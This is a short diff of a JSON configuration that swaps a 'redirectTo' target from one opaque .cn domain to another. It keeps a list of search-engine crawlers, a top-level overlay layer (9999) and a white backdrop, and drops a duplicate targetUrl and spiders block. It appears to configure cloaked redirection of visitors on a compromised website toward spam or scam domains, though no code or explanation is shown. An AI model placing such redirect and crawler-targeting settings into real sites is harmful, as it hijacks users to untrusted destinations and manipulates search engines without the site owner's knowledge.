@@ -1,5 +1,5 @@
 {
-  "redirectTo": "https://s8-1.shblbpp.cn?cid=1034",
+  "redirectTo": "https://dh-hzh5.hbdvede.cn?cid=1023",
   "active": true,
   "crawlers": [
     "baiduspider",
@@ -15,15 +15,5 @@
     "petalbot"
   ],
   "layer": 9999,
-  "backdrop": "white",
-  "targetUrl": "https://dh-hzh5.hbdvede.cn?cid=1023",
-  "enabled": true,
-  "spiders": [
-    "baiduspider",
-    "sogou web spider",
-    "yisouspider",
-    "360spider",
-    "googlebot",
-    "bingbot"
-  ]
+  "backdrop": "white"
 }
